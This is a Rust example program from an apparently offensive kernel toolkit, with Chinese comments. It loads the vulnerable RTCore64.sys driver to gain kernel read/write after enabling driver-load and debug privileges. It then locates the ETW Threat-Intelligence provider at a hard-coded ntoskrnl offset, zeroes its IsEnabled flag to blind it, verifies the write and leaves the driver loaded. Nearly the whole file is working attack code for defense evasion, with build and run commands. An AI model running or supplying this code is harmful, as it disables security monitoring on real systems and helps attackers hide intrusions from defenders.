//! 任务 I：ETW-TI provider 内核 blind（管理员运行）。
//!
//! 链路：
//!   bootstrap_byovd → KernelRw
//!   → EtwTiBlind { prov_reg_handle_kva = base + 0x40A6B0, offsets(17763) }
//!   → is_blinded? (读 IsEnabled) → blind() (写 IsEnabled=0) → is_blinded? (确认)
//! 验证：logman query "Microsoft-Windows-Threat-Intelligence"
//! 红线：blind 前先 kread 验证 IsEnabled==enabled；blind 是 HVCI-safe 数据写。
//!
//! 编译: cargo +nightly build --release -Z build-std=core,alloc \
//!        --manifest-path crates\operator-kernelsdk\Cargo.toml \
//!        --target x86_64-pc-windows-msvc --example etw_ti_blind_test
//! 运行: target\...\examples\etw_ti_blind_test.exe



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::etwti::{EtwTiBlind, EtwTiOffsets};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::EtwTiKit;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

// 与 bootstrap_test 一致：驱动放 system32\drivers，相对 ImagePath。
#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];

/// ntoskrnl!EtwThreatIntProvRegHandle RVA (build 17763.1339, PDB-resolved).
#[cfg(target_os = "windows")]
const ETW_TI_HANDLE_RVA: u32 = 0x40A6B0;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}

#[cfg(target_os = "windows")]
fn enable_privileges() {
    for (luid, name) in [(10u32, "SeLoadDriver"), (20u32, "SeDebug")] {
        let mut prev: i32 = 0;
        let s = unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut prev) };
        println!("[priv] {} -> status 0x{:x}", name, s as u32);
    }
}

#[cfg(target_os = "windows")]
fn main() {
    println!("[etw_ti_blind_test] start pid={}", std::process::id());
    enable_privileges();

    // ---- bootstrap ----
    println!("[I.1] bootstrap_byovd ...");
    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };

    // ---- ntoskrnl base + handle KVA ----
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap_or_else(|e| {
        eprintln!("[FAIL] ntoskrnl_base: {}", e);
        loaded.unload();
        std::process::exit(2);
    });
    let handle_kva = base + ETW_TI_HANDLE_RVA as usize;
    println!(
        "[I.2] ntoskrnl base=0x{:016x} | EtwThreatIntProvRegHandle KVA=0x{:016x}",
        base, handle_kva
    );

    let offsets = EtwTiOffsets::for_build(17763).unwrap();
    let kit = EtwTiBlind {
        prov_reg_handle_kva: handle_kva,
        offsets,
    };

    // ---- 红线：blind 前先读 IsEnabled，确认 provider 当前 enabled ----
    println!("[I.3] pre-blind is_blinded() check (kread IsEnabled) ...");
    let was_blinded = match kit.is_blinded(&krw) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[FAIL] pre-blind is_blinded: {}", e);
            loaded.unload();
            std::process::exit(3);
        }
    };
    // 直接读 IsEnabled 原值（用于诊断，显示真实字节）
    if let Ok(guid_entry) = krw.kread_u64(handle_kva) {
        if guid_entry != 0 {
            let prov = krw
                .kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
                .unwrap_or(0) as usize;
            if prov != 0 {
                let ie_kva = prov + offsets.provider_block_to_enable_info;
                if let Ok(v) = krw.kread_u64(ie_kva) {
                    println!("       IsEnabled raw @0x{:016x} = 0x{:016x}", ie_kva, v);
                }
            }
        }
    }
    println!(
        "[I.3] is_blinded(pre) = {} (false = provider ENABLED)",
        was_blinded
    );

    // ---- blind：写 IsEnabled = 0 ----
    println!("[I.4] EtwTiBlind::blind() — writing IsEnabled=0 ...");
    if let Err(e) = kit.blind(&krw) {
        eprintln!("[FAIL] blind: {}", e);
        loaded.unload();
        std::process::exit(4);
    }
    println!("[OK] blind() returned Ok");

    // ---- 验证：is_blinded 应为 true ----
    match kit.is_blinded(&krw) {
        Ok(true) => println!("[I.5] is_blinded(post) = true — ETW-TI provider DISABLED ✓"),
        Ok(false) => {
            eprintln!("[FAIL] is_blinded(post) = false — blind did not take effect");
            loaded.unload();
            std::process::exit(5);
        }
        Err(e) => {
            eprintln!("[FAIL] post is_blinded: {}", e);
            loaded.unload();
            std::process::exit(6);
        }
    }
    // 再读一次 raw IsEnabled 确认写成了 0。
    if let Ok(guid_entry) = krw.kread_u64(handle_kva) {
        if guid_entry != 0 {
            let prov = krw
                .kread_u64(guid_entry as usize + offsets.guid_entry_to_provider_block)
                .unwrap_or(0) as usize;
            if prov != 0 {
                let ie_kva = prov + offsets.provider_block_to_enable_info;
                if let Ok(v) = krw.kread_u64(ie_kva) {
                    println!(
                        "       IsEnabled raw @0x{:016x} = 0x{:016x} (post-blind)",
                        ie_kva, v
                    );
                }
            }
        }
    }

    println!("\n[etw_ti_blind_test] DONE — ETW-TI blinded. Driver kept loaded.");
    println!("    verify: logman query \"Microsoft-Windows-Threat-Intelligence\"");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
